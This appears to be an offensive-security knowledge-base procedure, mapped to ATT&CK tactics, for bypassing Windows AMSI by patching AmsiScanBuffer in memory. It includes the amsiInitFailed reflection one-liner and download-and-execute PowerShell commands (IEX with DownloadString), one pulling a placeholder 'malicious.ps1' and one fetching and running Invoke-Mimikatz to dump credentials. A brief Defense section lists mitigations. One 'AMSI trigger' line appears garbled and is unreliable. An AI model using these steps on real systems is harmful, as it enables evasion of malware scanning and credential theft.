---
id: ba124c79-4184-456f-b86e-a9c23323e8e5
name: Patch-AmsiScanBuffer-to-Bypass-AMSI
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:25.896222+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Hooking|T1179 - Hooking]]'
  - '[[techniques/Modify Registry|T1112 - Modify Registry]]'
sub_techniques: []
tags:
  - '[[tags/Patching amsi.dll AmsiScanBuffer by rasta-mouse]]'
  - amsi-bypass
  - defense-evasion
commands: []
platforms:
  - Windows
tools: []
validated: true
---

# Patch-AmsiScanBuffer-to-Bypass-AMSI

## Summary

This procedure patches the AmsiScanBuffer function in amsi.dll to disable Antimalware Scan Interface (AMSI) scanning on Windows systems. By overwriting the function's initial bytes with a return instruction, it prevents AMSI from analyzing and blocking malicious PowerShell scripts or other code, allowing execution of payloads that would otherwise be detected by antivirus solutions relying on AMSI.

## Description

AMSI is a Windows interface that enables applications like PowerShell to scan content for malware before execution. Attackers can bypass this by directly modifying the memory of the AmsiScanBuffer function in amsi.dll, which is responsible for performing the scan. This procedure uses PowerShell with P/Invoke to load the DLL, locate the function, alter its memory protection, and patch it with bytes that cause the function to return immediately without scanning. This technique is effective in post-exploitation scenarios where an attacker has code execution on a target but needs to evade detection for further actions like credential dumping or persistence. It requires administrative privileges or a process context with write access to system memory. Success enables running obfuscated or malicious scripts without AMSI interference, but the patch is in-memory and may not persist across reboots or process restarts.

## Requirements

1. Administrative privileges on the target Windows system (or execution in a high-privilege process context).
2. PowerShell execution policy allowing script runs (bypass if needed via Set-ExecutionPolicy).
3. Target system running Windows 10 or later with AMSI enabled (common in enterprise environments).
4. No additional tools required beyond native PowerShell and Win32 APIs.

## Defense

- Keep amsi.dll and Windows Defender updated to patch known bypass techniques.
- Enable PowerShell logging (Module, ScriptBlock, and Transcription) to capture P/Invoke calls and memory modifications.
- Implement application control (e.g., AppLocker or WDAC) to restrict unsigned PowerShell scripts and DLL loads.
- Monitor for anomalous memory writes to amsi.dll via EDR tools or Sysmon events (e.g., Event ID 8 for CreateRemoteThread or raw memory access).
- Use integrity checks on critical DLLs and behavioral analysis to detect patching attempts.

## Objectives

1. Disable AMSI scanning by patching AmsiScanBuffer in memory.
2. Enable execution of malicious code without detection by AMSI-integrated security tools.
3. Maintain stealth during post-exploitation activities like credential access or persistence.

## Instructions

### Step 1: Load and Patch AmsiScanBuffer

**Context**: This step uses a PowerShell script to dynamically load amsi.dll, retrieve the address of AmsiScanBuffer, change its memory protection to allow writes, and overwrite the first bytes with a patch that forces an early return (0xC3 RET instruction effectively skips the scan). The string concatenation (e.g., "am" + "si.dll") helps evade basic static detection.

**Code** ([[codes/PowerShell-Patch-AmsiScanBuffer]]):

Execute the script in a PowerShell session on the target. Save it to a .ps1 file or run inline via powershell.exe -ExecutionPolicy Bypass -File script.ps1.

> The script will output no console messages on success but can be verified by attempting to run AMSI-triggering code (e.g., [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)) afterward, which should now succeed without blocking.

### Step 2: Verify the Bypass

**Context**: Test the patch by executing code that AMSI would normally flag, such as a simple obfuscated command. If the patch succeeded, the code runs without error or blocking.

**Instructions**: In the same PowerShell session, run a test like:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
```

Or a known AMSI trigger:

```powershell
"amsi" | ForEach {$_ = $_[($_ -match '[a-z]')*([int[]](65..90) + 34 + 39 + 63 + 64 + 42 + 0..9 | %{[char]$_}) -join '']}
```

> Expected: The malicious or obfuscated code executes without AMSI flagging it as malware. If unpatched, PowerShell would throw an error like "AmsiUtils:ScanBuffer failed."

### Step 3: Execute Follow-On Malicious Code

**Context**: With AMSI bypassed, proceed to load and run payloads for further objectives, such as credential dumping or persistence. This step confirms the procedure's effectiveness in a real attack chain.

**Instructions**: Load and invoke a secondary script or command, e.g., for credential access:

```powershell
# Example: Invoke Mimikatz-like functionality (assuming a safe test environment)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
Invoke-Mimikatz
```

> Expected: Successful execution of the payload without AMSI intervention, yielding results like dumped hashes or tokens.
